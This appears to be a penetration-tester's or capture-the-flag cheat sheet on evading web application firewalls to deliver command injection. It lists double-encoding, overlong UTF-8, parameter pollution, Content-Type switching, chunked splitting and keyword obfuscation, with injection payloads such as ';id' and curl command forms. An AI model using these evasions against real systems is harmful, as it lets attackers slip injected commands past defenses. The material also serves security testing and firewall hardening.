# WAF Bypass — signatures and the encoding games that beat them

## The WAF sits in front — the two-layer defense

`client → WAF/CDN (modsec/cloudflare/aws-waf) → app → shell`

The WAF matches signatures on the RAW request; the app decodes then
shells it. Two parsers — `parser-differential`-style attacks apply.

## Detection — is there a WAF?

- `403`/`406`/`Blocked`/`Access Denied`/`Mod_Security` banners
- `Server: cloudflare`/`awselb`/`akamai` headers
- clean requests pass, `;id` gets 403 — signature-based rejection
- `X-CDN`/`CF-RAY`/`X-Amz-*` headers

## Encoding-evasion ladder

| WAF checks | Evade with |
|---|---|
| raw URL-decoded body | double-encode `%25%33%42`→`%3B`→`;` |
| `%XX` decode | `%uXXXX` (IIS), UTF-8 overlong `%c0%bb`→`;` |
| `;` literal | `%0a` newline, `%0d`, tab `%09` |
| `&&`/`\|\|` | `%26%26`/`%7C%7C` then check decode order |
| keyword `cat` | `c'a't`, `c$@at`, `/???/cat`, `$(echo Y2F0\|base64 -d)` |
| `flag` | `fl*`, `f[a]ag`, `f${x}lag` |
| payload length | chunked transfer, header-split |
| HTTP param pollution | `x=1&x=2` — WAF sees x=1, app sees x=2 (or merged) |
| `Content-Type` | `application/json` vs `x-www-form-urlencoded` mismatch |

## Parameter pollution — `x=1&x=2` / `x[]=1` / `x=1;x=2`

- `?x=safe&x=evil` — WAF checks first, app uses last (PHP) or merges
  (ASP.NET concatenates with `,`)
- `?x[]=evil` — array coercion in PHP/node — WAF rule for `x` doesn't
  fire on `x[]`
- `?x[0]=evil` — nested param

## Content-Type switching

- `application/json` body where the endpoint also reads form-encoded —
  WAF's form parser skips JSON bodies; app parses them anyway
- `multipart/form-data` for a normally-`urlencoded` param — WAF's
  parser may not decode the multipart fields
- `text/plain` vs `application/x-www-form-urlencoded` — `=` and `&`
  still split in PHP's form parser? — PHP doesn't parse text/plain —
  but the WAF might skip checking it entirely

## Path normalization tricks — before the param reaches the app

```
/ping/%2e%2e/x         — dot-segment
/ping/./x              — dot
//ping                  — double slash
/ping;/x               — path params
/ping?x=1;x=2          — ; param separator
/ping?x=1&&x=2         — && as separator in some parsers
/ping%3fx%3d1          — encoded ? — if decoded at app
```

## The `@`/`?`/`#`/`!`/`~` meta-bytes that break parsers

- `@` in URL userinfo — `http://x@y/` parsing differences
- `?` split — `?a=b?c=d` — query parser ambiguity
- `#` fragment — `#x` never sent — `%23` is the encoded form
- `~`/`!` — rarely significant

## Chunked Transfer-Encoding — splitting the signature

`Transfer-Encoding: chunked` — send the body in chunks split mid-token:

```
4
x;id
0
```

WAF sees the whole stream (should) — but boundary-split signatures
miss if the WAF inspects per-chunk. Combined with `TE`+`CL` confusion
→ `web-request-smuggling`.

## Obfuscating the payload string itself

- case: `CaT`/`CAT` (Windows cmds — case-insensitive!)
- mixed-encoding: `c%61t` — one char encoded
- unicode: `ｃａｔ` fullwidth → normalization may collapse to `cat`
- null: `c%00at` — `cat` after null-strip on some parsers
- tab/newline inside the name: `c%0aat` — IFS-split trick makes it work

## The "the WAF only checks the URL" gap — POST body is unchecked

- move the injection from `GET ?x=` to `POST x=` or JSON body or
  multipart `name=` field — some WAFs only inspect query strings
- `Cookie: x=payload` — cookies often unchecked
- `X-Header` fields — custom headers

## HTTP verb tricks — `GET`/`POST`/`PUT`/`PATCH`/`HEAD`

- `HEAD`/`OPTIONS`/`PUT`/`PATCH` — the WAF may allow or not inspect
- `X-HTTP-Method-Override: PUT`/`X-Method-Override` header — tunnels
  a different verb under POST

## The `--data-binary`/`--data-urlencode` curl shaping

```bash
curl --data-urlencode 'x=127.0.0.1;id' url     — encoded
curl --data-binary 'x=...' url                 — raw
curl -H 'Content-Type: application/json' -d '{"x":"..."}' url
curl -F 'x=...' url                            — multipart
```

## Falsifiers

- the WAF inspects at the same layer the app parses AND covers all
  encodings/transports/params — then WAF-bypass is closed; the bug may
  still exist in argv/flag space the WAF can't see semantically

## Output to record

- which WAF + which bypass form (encoding/param-pollution/CT-switch)
  passed
